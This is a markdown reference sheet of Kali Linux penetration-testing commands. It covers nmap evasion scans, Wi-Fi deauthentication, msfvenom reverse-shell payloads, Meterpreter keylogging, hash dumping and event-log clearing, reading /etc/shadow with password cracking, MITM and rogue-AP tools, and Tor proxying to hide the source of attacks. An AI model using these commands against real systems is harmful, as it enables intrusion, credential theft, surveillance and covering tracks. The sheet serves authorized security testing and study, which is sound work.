# Kali Tools & Cybersecurity Reference

> A reference guide for penetration testing and cybersecurity tools available in Kali Linux.

## Table of Contents
1. [Network Reconnaissance](#network-reconnaissance)
   - [Nmap - Port Scanning](#nmap---port-scanning)
2. [Wireless Attacks](#wireless-attacks)
3. [Exploitation Frameworks](#exploitation-frameworks)
   - [Metasploit Framework](#metasploit-framework)
   - [Msfvenom - Payload Generation](#msfvenom---payload-generation)
   - [Meterpreter](#meterpreter)
4. [Privilege Escalation](#privilege-escalation)
   - [Linux Enumeration](#linux-enumeration)
   - [Automated Tools](#automated-tools)
5. [Vulnerability Scanning](#vulnerability-scanning)
6. [Network Attacks](#network-attacks)
   - [Man-in-the-Middle](#man-in-the-middle)
   - [Evil Twin / Rogue AP](#evil-twin--rogue-ap)
7. [Anonymity & Proxying](#anonymity--proxying)

---

## Network Reconnaissance

### Nmap - Port Scanning
*Network exploration tool and security scanner for discovering hosts, services, and vulnerabilities.*

#### Basic Scans
```bash
nmap <target>                    # Basic TCP SYN scan of top 1000 ports
nmap -p- <target>                # Scan all 65535 ports
nmap -p 22,80,443 <target>       # Scan specific ports
nmap -sV <target>                # Detect service versions on open ports
nmap -O <target>                 # Detect operating system
nmap -A <target>                 # Aggressive scan (version, OS, traceroute, scripts)
```

#### Stealth & Evasion Scans
```bash
nmap -sN <target>                # TCP Null scan (no flags set)
nmap -sF <target>                # TCP FIN scan (FIN flag only)
nmap -sX <target>                # TCP Xmas scan (FIN, PSH, URG flags)
nmap -sA <target>                # TCP ACK scan (discover firewall rules)
nmap -sW <target>                # TCP Window scan (check RST responses)
nmap -sI <zombie_ip> <target>    # Idle/Zombie scan (use third-party host)
```

#### Firewall Evasion
```bash
nmap -f <target>                                      # Fragment packets into 8-byte chunks
nmap -ff <target>                                     # Fragment packets into 16-byte chunks
nmap --mtu <value> <target>                           # Set custom MTU (must be multiple of 8)
nmap -D <decoy1>,<decoy2>,ME <target>                # Use decoy IP addresses
nmap -S <spoofed_ip> -e <interface> -Pn <target>     # Spoof source IP address
nmap --spoof-mac <mac_address> <target>              # Spoof MAC address
nmap --data-length <num> <target>                    # Append random data to packets
nmap --source-port <port> <target>                   # Use specific source port
```

#### NSE Scripts
```bash
nmap -sC <target>                      # Run default NSE scripts
nmap --script=<category> <target>      # Run scripts by category (auth, vuln, exploit)
nmap --script=<script_name> <target>   # Run specific script by name
nmap --script="ftp*" <target>          # Run all FTP-related scripts
```

#### Output Formats
```bash
nmap -oN <file> <target>       # Save output in normal format
nmap -oG <file> <target>       # Save output in greppable format
nmap -oX <file> <target>       # Save output in XML format
nmap -oA <basename> <target>   # Save in all formats
```

#### Common Options
```bash
nmap -v <target>            # Verbose output
nmap -vv <target>           # Very verbose output
nmap --reason <target>      # Show reason for port state
nmap -Pn <target>           # Skip host discovery (treat as online)
nmap --traceroute <target>  # Trace network path to target
```

---

## Wireless Attacks
*Tools for wireless network auditing, monitoring, and attacking Wi-Fi networks.*

```bash
airmon-ng check kill                                          # Kill conflicting processes
airmon-ng start <interface>                                   # Enable monitor mode
airodump-ng <interface> --band a --essid <name>              # Scan for networks and capture packets
aireplay-ng -0 <count> -a <ap_mac> -c <client_mac> <iface>  # Deauthentication attack
```

---

## Exploitation Frameworks

### Metasploit Framework
*Comprehensive penetration testing platform for finding, exploiting, and validating vulnerabilities.*

#### Basic Console Usage
```bash
msfconsole                      # Start Metasploit console
search <term>                   # Search for modules
use <module>                    # Select a module
show options                    # Display module options
set <option> <value>            # Set module option
setg <option> <value>           # Set global option
run                             # Execute the module (alias: exploit)
back                            # Exit current module
```

#### Database & Workspaces
```bash
systemctl start postgresql      # Start PostgreSQL database
msfdb init                      # Initialize Metasploit database
workspace -a <name>             # Add new workspace
workspace -d <name>             # Delete workspace
db_nmap -sV <target>            # Run nmap and save to database
hosts                           # List discovered hosts
services                        # List discovered services
hosts -R                        # Set RHOSTS from database
```

#### Session Management
```bash
sessions -l                     # List active sessions
sessions <id>                   # Interact with session
background                      # Background current session (Ctrl+Z)
```

### Msfvenom - Payload Generation
*Standalone payload generator (replacement for msfpayload and msfencode).*

```bash
# List available options
msfvenom --list payloads        # List available payloads
msfvenom --list formats         # List output formats

# Generate payloads
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <file>

# Platform-specific examples
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
msfvenom -p cmd/unix/reverse_python LHOST=<ip> LPORT=<port> -f raw -o shell.py

# Encoded payload
msfvenom -p <payload> -e <encoder> LHOST=<ip> LPORT=<port> -f <format>
```

### Meterpreter
*Advanced payload that provides an interactive shell with extensive post-exploitation capabilities.*

#### System Information
```bash
sysinfo                         # Get system information
getuid                          # Show current user
getpid                          # Show current process ID
```

#### Process Management
```bash
ps                              # List running processes
migrate <pid>                   # Migrate to another process
```

#### Credential Access
```bash
hashdump                        # Dump password hashes from SAM
load kiwi                       # Load Mimikatz extension
```

#### File Operations
```bash
search -f <filename>            # Search for files
download <file>                 # Download file from target
upload <file>                   # Upload file to target
```

#### Post-Exploitation
```bash
shell                           # Drop to system shell
background                      # Background current session
screenshot                      # Capture screenshot
keyscan_start                   # Start keylogger
keyscan_dump                    # Dump captured keystrokes
keyscan_stop                    # Stop keylogger
getsystem                       # Attempt privilege escalation
clearev                         # Clear event logs
webcam_snap                     # Take webcam photo
record_mic -d <seconds>         # Record audio
```

---

## Privilege Escalation

### Linux Enumeration
*Manual commands for discovering privilege escalation vectors on Linux systems.*

#### System Information
```bash
hostname                        # Display system hostname
uname -a                        # Display system information
cat /proc/version               # Show kernel version
cat /etc/issue                  # Display distribution information
ps aux                          # List all running processes
env                             # Display environment variables
```

#### User & Group Information
```bash
id <user>                       # Show user ID and groups
sudo -l                         # List sudo privileges for current user
cat /etc/passwd                 # List all users
cat /etc/passwd | cut -d ":" -f 1                # List only usernames
cat /etc/passwd | grep home                      # List users with home directories
cat /etc/shadow                                  # Show password hashes (requires root)
history                                          # Show command history
```

#### Network Information
```bash
netstat -a                      # Show all network connections
netstat -l                      # Show listening ports
```

#### Finding Vulnerabilities
```bash
find / -perm -u=s -type f 2>/dev/null           # Find SUID binaries
find / -writable 2>/dev/null                    # Find writable directories
find / -user <username> -name <filename>        # Find files owned by user
getcap -r / 2>/dev/null                         # List file capabilities
cat /etc/crontab                                # Check scheduled tasks
grep -ril "password" / 2>/dev/null              # Search for password strings
```

### Automated Tools
*Scripts and tools that automate Linux privilege escalation enumeration.*

```bash
linpeas.sh                                      # Linux privilege escalation enumeration script
linenum.sh                                      # Linux enumeration script
linux-exploit-suggester.sh                      # Suggest kernel exploits
```

#### Password Cracking
```bash
# Combine passwd and shadow files for John the Ripper
unshadow /etc/passwd /etc/shadow > passwords.txt
john --wordlist=rockyou.txt passwords.txt
```

---

## Vulnerability Scanning
*Tools for identifying security vulnerabilities in systems and applications.*

```bash
searchsploit <term>             # Search Exploit-DB offline database
searchsploit -u                 # Update searchsploit database
nessus                          # Automated vulnerability scanner (GUI)
```

---

## Network Attacks

### Man-in-the-Middle
*Tools for intercepting and manipulating network traffic.*

```bash
bettercap                       # Network attack and monitoring framework
ettercap -G                     # Launch Ettercap GUI for MITM attacks
```

### Evil Twin / Rogue AP
*Tools for creating fake wireless access points.*

```bash
airgeddon                       # Wireless attack automation tool for Evil Twin APs
```

---

## Anonymity & Proxying
*Tools for anonymizing network traffic and hiding the source of attacks.*

```bash
tor                             # Start Tor network service
service tor start               # Start Tor as system service
proxychains <command>           # Route command through proxy chain
proxychains firefox             # Launch Firefox through proxies
proxychains nmap <target>       # Scan through proxies
torsocks <command>              # Route command through Tor
torsocks firefox                # Launch Firefox through Tor
```

